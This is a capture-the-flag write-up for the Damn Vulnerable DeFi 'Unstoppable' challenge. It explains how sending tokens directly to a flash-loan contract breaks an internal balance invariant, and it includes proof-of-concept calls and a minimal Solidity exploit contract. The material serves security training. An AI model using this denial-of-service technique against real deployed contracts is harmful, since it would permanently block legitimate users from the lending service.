
 Damn-unstopable-CTF :  https://www.damnvulnerabledefi.xyz/challenges/unstoppable/



Solution :

🔍 Challenge Recap
🎯 Goal:
Stop the UnstoppableLender contract from offering flash loans.

🧾 You start with:
100 DVT tokens in your wallet.

🧱 Vulnerable Contract Setup (Simplified)
Here’s the relevant part of the contract logic:


function flashLoan(...) external {
    uint256 balanceBefore = token.balanceOf(address(this));
    assert(poolBalance == balanceBefore); // ⚠️ Critical invariant check

    ...
}

function depositTokens(uint256 amount) external {
    require(amount > 0);
    token.transferFrom(msg.sender, address(this), amount);
    poolBalance += amount; // 🧠 internal accounting update
}
🚨 Core Vulnerability
poolBalance: updated only when depositTokens() is called.

balanceBefore: uses the real token balance of the contract (token.balanceOf(address(this))).

If anyone transfers tokens directly to the contract (without using depositTokens()), the balance increases without updating poolBalance.

So when the flash loan runs:


assert(poolBalance == balanceBefore); // ❌ fails forever
⚙️ Proof of Concept (POC)
Here’s how you can break it with a simple token transfer:

Step-by-step
✅ Step 1: Approve transfer
Assuming you're using a test script or console:




dvtToken.approve(address(attackerContract), 100 ether);
✅ Step 2: Send 1 token directly to the UnstoppableLender contract



dvtToken.transfer(address(unstoppableLender), 1 ether); // <- ⚠️ Bypasses depositTokens
At this point:

poolBalance = 1_000_000 DVT (unchanged)

token.balanceOf(unstoppableLender) = 1_000_001 DVT

✅ Step 3: Try to use flashLoan()
This will fail:


unstoppableLender.flashLoan(...); // 💥 reverts due to assert
❌ Why?
This line fails:



assert(poolBalance == token.balanceOf(address(this)));
And now no one — not even legit users — can flash loan anymore. The vault is permanently bricked for flash loans.

🔓 Minimal Exploit Contract
Here’s an exploit contract that demonstrates the attack:

contract UnstoppableExploit {
    IERC20 public immutable dvt;

    constructor(IERC20 _dvt) {
        dvt = _dvt;
    }

    function attack(address poolAddress, uint256 amount) external {
        dvt.transferFrom(msg.sender, address(this), amount);
        dvt.transfer(poolAddress, amount); // ⛔ Break invariant
    }
}
Deploy & Call:

exploit.attack(address(unstoppableLender), 1 ether);